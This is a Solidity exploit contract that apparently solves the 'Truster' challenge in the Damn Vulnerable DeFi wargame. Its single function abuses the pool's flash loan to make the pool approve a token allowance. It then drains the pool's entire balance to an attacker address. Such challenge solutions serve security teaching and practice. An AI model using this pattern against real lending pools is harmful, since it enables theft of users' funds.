// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ExploitTruster {
    using Address for address;

    address private immutable tP;
    IERC20 private immutable damnValuableToken;

    constructor(address _targetPool, address _damnValuableToken) {
        tP = _targetPool;
        damnValuableToken = IERC20(_damnValuableToken);
    }

    function execute(address attacker) public {
        uint256 amountToSteal = damnValuableToken.balanceOf(tP);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amountToSteal
        );

        tP.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                address(this),
                address(damnValuableToken),
                data
            )
        );

        require(
            damnValuableToken.transferFrom(tP, attacker, amountToSteal),
            "EXPLOIT: Transfer from failed"
        );
    }
}
